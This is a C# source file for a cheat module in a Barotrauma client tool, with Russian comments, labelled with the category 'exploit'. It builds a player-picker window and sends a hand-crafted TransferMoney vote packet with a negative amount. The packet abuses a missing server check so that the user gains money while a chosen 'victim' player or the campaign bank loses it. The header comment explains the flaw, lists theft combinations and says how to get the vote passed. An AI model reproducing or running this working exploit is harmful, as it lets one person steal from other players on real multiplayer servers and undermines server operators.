using System;
using System.Collections.Generic;
using System.Globalization;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    // ============================================================
    //  NEG TRANSFER (волна 588) — «выбрал жертву из списка → минус».
    //
    //  ПРЯМОЙ путь (TRANSFER_MONEY) минус РЕЖЕТ: ServerReadMoney
    //  `if (transfer.Amount <= 0) return`. Поэтому вотчинный путь:
    //  Vote TransferMoney amount = ReadInt32() БЕЗ ≤0-чека.
    //  TransferVote.Finish: fromWallet.TryDeduct(-X) — CanAfford
    //  = Balance >= -X ВСЕГДА true → Deduct(-X) = +X отправителю;
    //  toWallet.Give(-X) = −X получателю.
    //
    //  Комбо (Finish в Voting.cs:76):
    //   ОТ=Я, К=жертва:  жертва −X, ты +X        (кража кошелька)
    //   ОТ=Я, К=0xFF:    банк −X, ты +X          (налог на банк)
    //   ОТ=БАНК, К=жертва: банк −X, жертва −X    (могила)
    //   БОНУС: жертва без персонажа (не в раунде) → To.Character?.Wallet
    //   = null → Give пропущен: ты +X, НИКТО не потерял (из воздуха).
    //
    //  ПРОХОЖДЕНИЕ (Voting.Update): нужен минимум 1 голос «ЗА» от
    //  ДРУГОГО in-game клиента (стартер в quorum НЕ входит, соло =
    //  мгновенный фейл total=0). Голосуют после 30с таймаута;
    //  неответившие не считаются. Вотчина ВИДНА ВСЕМ.
    //  Отрицательная сумма проходит ВСЕГДА независимо от баланса.
    // ============================================================
    public class NegTransferModule : CSModuleBase
    {
        public override string Id   => "neg_transfer";
        public override string Name => "Neg Transfer";
        public override string Description =>
            "Перевод ОТ СЕБЯ МИНУСОМ выбранному игроку.\n\n" +
            "• Список игроков → клик = жертва\n" +
            "• ОТ: Я или БАНК | сумма: -1К ... -1М или своя\n" +
            "• TryDeduct(-X) всегда true → ты +X, цель -X\n" +
            "• Нужно 1 голос ЗА от другого игрока (30с)\n" +
            "• Вотчина видна всем — договаривайся/отвлекай";

        public override string Category => "exploit";

        private static readonly Color AccentColor = new Color(255, 170, 90);
        private static readonly Color OkColor     = new Color(120, 255, 140);
        private static readonly Color DangerColor = new Color(255, 110, 110);
        private static readonly Color DimColor    = new Color(160, 170, 190);
        private static readonly Color RowColor    = new Color(30, 36, 48);
        private static readonly Color SelColor    = new Color(90, 40, 40);

        private static GUIMessageBox _window;
        private static GUIListBox _list;
        private static GUITextBlock _status;
        private static GUITextBox _amountBox;
        private static GUIButton _fromMeBtn;
        private static GUIButton _fromBankBtn;

        private static bool _fromMe = true;      // true = мой кошелёк, false = банк
        private static int  _amount = -10000;    // ВСЕГДА минус
        private static Client _target;           // выбранный получатель
        private static string _lastNote = "";

        public override string GetLabel() => "Neg Transfer ➖💸";

        public override void OnClick()
        {
            if (GameMain.Client == null)
            {
                GUI.AddMessage("[NegTr] Нет подключения к серверу", DangerColor);
                return;
            }
            if (GameMain.GameSession?.Campaign == null)
            {
                GUI.AddMessage("[NegTr] Нужна кампания", DangerColor);
                return;
            }
            if (_window != null) { CloseWindow(); return; }
            BuildWindow();
        }

        private static void BuildWindow()
        {
            try
            {
                _target = null;
                _lastNote = "";
                _window = new GUIMessageBox("Neg Transfer", "", Array.Empty<LocalizedString>(), new Vector2(0.6f, 0.85f));
                var content = _window.Content;
                content.ClearChildren();

                // ---- статус-строка ----
                _status = new GUITextBlock(
                    new RectTransform(new Vector2(1f, 0.09f), content.RectTransform),
                    "", textAlignment: Alignment.CenterLeft);
                _status.TextColor = AccentColor;
                _status.CanBeFocused = false;

                // ---- ряд ОТ ----
                var fromFrame = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.075f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.095f) }, style: null);
                var fromLayout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.98f, 0.9f), fromFrame.RectTransform, Anchor.Center), isHorizontal: true);
                var fromLabel = new GUITextBlock(
                    new RectTransform(new Vector2(0.16f, 1f), fromLayout.RectTransform), "ОТ:");
                fromLabel.CanBeFocused = false;
                _fromMeBtn = new GUIButton(new RectTransform(new Vector2(0.42f, 0.9f), fromLayout.RectTransform), "Я (мой кошелёк)");
                _fromMeBtn.OnClicked = (b, d) => { _fromMe = true; UpdateFromButtons(); UpdateStatus(); return true; };
                _fromBankBtn = new GUIButton(new RectTransform(new Vector2(0.42f, 0.9f), fromLayout.RectTransform), "БАНК 🏦");
                _fromBankBtn.OnClicked = (b, d) => { _fromMe = false; UpdateFromButtons(); UpdateStatus(); return true; };
                UpdateFromButtons();

                // ---- список игроков ----
                var listLabel = new GUITextBlock(
                    new RectTransform(new Vector2(1f, 0.045f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.175f) },
                    "Кому (клик = выбрать):", textAlignment: Alignment.CenterLeft);
                listLabel.TextColor = DimColor;
                listLabel.CanBeFocused = false;

                var listFrame = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.38f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.22f) }, style: null);
                _list = new GUIListBox(new RectTransform(Vector2.One, listFrame.RectTransform));
                _list.Color = new Color(20, 25, 35);
                RefreshPlayers();

                // ---- суммы ----
                var amountFrame = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.075f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.61f) }, style: null);
                var amountLayout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.98f, 0.9f), amountFrame.RectTransform, Anchor.Center), isHorizontal: true);
                MakeAmountBtn(amountLayout, 0.13f, "-1К", -1000);
                MakeAmountBtn(amountLayout, 0.13f, "-10К", -10000);
                MakeAmountBtn(amountLayout, 0.13f, "-100К", -100000);
                MakeAmountBtn(amountLayout, 0.13f, "-1М", -1000000);
                var customFrame = new GUIFrame(new RectTransform(new Vector2(0.22f, 1f), amountLayout.RectTransform), style: null);
                _amountBox = new GUITextBox(new RectTransform(Vector2.One, customFrame.RectTransform), _amount.ToString());
                var applyBtn = new GUIButton(new RectTransform(new Vector2(0.2f, 1f), amountLayout.RectTransform), "СВОЯ");
                applyBtn.OnClicked = (b, d) => { ParseCustom(); return true; };

                // ---- кнопки действия ----
                var actionLayout = new GUILayoutGroup(
                    new RectTransform(new Vector2(0.98f, 0.07f), content.RectTransform, Anchor.TopCenter)
                        { RelativeOffset = new Vector2(0f, 0.69f) }, isHorizontal: true);
                var goBtn = new GUIButton(new RectTransform(new Vector2(0.66f, 0.95f), actionLayout.RectTransform), "★ ЗАПУСТИТЬ ГОЛОСОВАНИЕ ★");
                goBtn.Color = SelColor;
                goBtn.OnClicked = (b, d) => { Launch(); return true; };
                var closeBtn = new GUIButton(new RectTransform(new Vector2(0.32f, 0.95f), actionLayout.RectTransform), "Закрыть");
                closeBtn.OnClicked = (b, d) => { CloseWindow(); return true; };

                UpdateStatus();
            }
            catch (Exception e)
            {
                GUI.AddMessage("[NegTr] GUI fail: " + e.Message, DangerColor);
                CloseWindow();
            }
        }

        private static void MakeAmountBtn(GUILayoutGroup layout, float relW, string text, int value)
        {
            var btn = new GUIButton(new RectTransform(new Vector2(relW, 1f), layout.RectTransform), text);
            btn.OnClicked = (b, d) =>
            {
                _amount = value;
                if (_amountBox != null) { _amountBox.Text = value.ToString(); }
                UpdateStatus();
                return true;
            };
        }

        private static void ParseCustom()
        {
            if (_amountBox == null) { return; }
            int v;
            if (int.TryParse(_amountBox.Text.Trim(), NumberStyles.Integer, CultureInfo.InvariantCulture, out v) && v != 0)
            {
                _amount = v > 0 ? -v : v; // храним ТОЛЬКО минус
                UpdateStatus();
            }
            else
            {
                GUI.AddMessage("[NegTr] Не число: " + _amountBox.Text, DangerColor);
            }
        }

        private static void UpdateFromButtons()
        {
            if (_fromMeBtn != null) { _fromMeBtn.Color = _fromMe ? SelColor : RowColor; }
            if (_fromBankBtn != null) { _fromBankBtn.Color = !_fromMe ? SelColor : RowColor; }
        }

        private static void RefreshPlayers()
        {
            if (_list == null) { return; }
            try
            {
                _list.Content.ClearChildren();

                var header = new GUIFrame(
                    new RectTransform(new Vector2(1f, 0.09f), _list.Content.RectTransform), style: null);
                header.Color = new Color(50, 60, 80);
                var headerText = new GUITextBlock(new RectTransform(Vector2.One, header.RectTransform),
                    "Игроки на сервере (жертва получает −X, ты +X):", textAlignment: Alignment.CenterLeft);
                headerText.TextColor = AccentColor;
                headerText.CanBeFocused = false;

                var clients = GameMain.Client?.ConnectedClients;
                if (clients == null || clients.Count == 0)
                {
                    AddNoteRow("Список пуст (ты один?)");
                    return;
                }

                foreach (Client c in clients)
                {
                    Client cc = c;
                    if (cc == null) { continue; }

                    string bal = "?";
                    try
                    {
                        if (cc.Character?.Wallet != null) { bal = cc.Character.Wallet.Balance.ToString(); }
                    }
                    catch { }

                    string tag = cc.Character == null ? " [не в раунде]" : "";
                    string suffix = "";
                    if (_target == cc) { suffix = "  ◀ ВЫБРАН"; }

                    var row = new GUIButton(
                        new RectTransform(new Vector2(1f, 0.09f), _list.Content.RectTransform),
                        cc.Name + tag + " — " + bal + " мк" + suffix);
                    row.Color = _target == cc ? SelColor : RowColor;
                    row.OnClicked = (b, d) =>
                    {
                        _target = cc;
                        GUI.AddMessage("[NegTr] цель: " + cc.Name, AccentColor);
                        RefreshPlayers();
                        UpdateStatus();
                        return true;
                    };
                }
            }
            catch (Exception e)
            {
                GUI.AddMessage("[NegTr] list fail: " + e.Message, DangerColor);
            }
        }

        private static void AddNoteRow(string text)
        {
            var row = new GUIFrame(
                new RectTransform(new Vector2(1f, 0.09f), _list.Content.RectTransform), style: null);
            row.Color = RowColor;
            var txt = new GUITextBlock(new RectTransform(Vector2.One, row.RectTransform), text,
                textAlignment: Alignment.Center);
            txt.TextColor = DimColor;
            txt.CanBeFocused = false;
        }

        private static void UpdateStatus()
        {
            if (_status == null) { return; }
            string from = _fromMe ? "Я" : "БАНК";
            string to = _target == null ? "выбери из списка" : _target.Name;
            string note = string.IsNullOrEmpty(_lastNote) ? "" : "\n" + _lastNote;
            _status.Text = "ОТ: " + from + "  →  К: " + to + "   СУММА: " + _amount + " мк" + note;
        }

        private static void Launch()
        {
            ParseCustom();
            if (_amount >= 0)
            {
                GUI.AddMessage("[NegTr] Сумма должна быть ОТРИЦАТЕЛЬНОЙ", DangerColor);
                return;
            }
            if (_target == null)
            {
                GUI.AddMessage("[NegTr] Сначала выбери получателя из списка", DangerColor);
                return;
            }

            byte fromSession = _fromMe ? GetMySession() : (byte)0xFF;
            if (_fromMe && fromSession == 0xFF)
            {
                GUI.AddMessage("[NegTr] Себя не нашёл в списке (не в раунде?)", DangerColor);
                return;
            }
            byte toSession = _target.SessionId;

            try
            {
                IWriteMessage msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.UPDATE_LOBBY);
                using (var segmentTable = SegmentTableWriter<ClientNetSegment>.StartWriting(msg))
                {
                    segmentTable.StartNewSegment(ClientNetSegment.Vote);
                    msg.WriteByte((byte)VoteType.TransferMoney);
                    msg.WriteBoolean(true);          // startVote
                    msg.WriteInt32(_amount);         // отрицательный — чека ≤0 тут НЕТ
                    msg.WriteByte(fromSession);      // 0xFF не матчится ни одному → банк
                    msg.WriteByte(toSession);
                    msg.WritePadBits();
                }
                GameMain.Client?.ClientPeer?.Send(msg, DeliveryMethod.Reliable);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[NegTr] send fail: " + e.Message, DangerColor);
                return;
            }

            _lastNote = "Вотчина запущена! Через 30с нужен 1 голос ЗА от другого игрока.\n" +
                        "Соло = мгновенный фейл. Вотчину видят все.";
            GUI.AddMessage("[NegTr] вотчина: " + _amount + " мк, " +
                (_fromMe ? "от тебя" : "от банка") + " → " + _target.Name, OkColor);
            GUI.AddMessage("[NegTr] нужен 1 голос ЗА (30с), видна всем!", AccentColor);
            UpdateStatus();
        }

        private static byte GetMySession()
        {
            try
            {
                Character me = Character.Controlled;
                var clients = GameMain.Client?.ConnectedClients;
                if (me == null || clients == null) { return 0xFF; }
                foreach (Client c in clients)
                {
                    if (c != null && c.Character == me) { return c.SessionId; }
                }
            }
            catch { }
            return 0xFF;
        }

        private static void CloseWindow()
        {
            try { _window?.Close(); } catch { }
            _window = null;
            _list = null;
            _status = null;
            _amountBox = null;
            _fromMeBtn = null;
            _fromBankBtn = null;
        }

        public override void Dispose()
        {
            CloseWindow();
            base.Dispose();
        }
    }
}
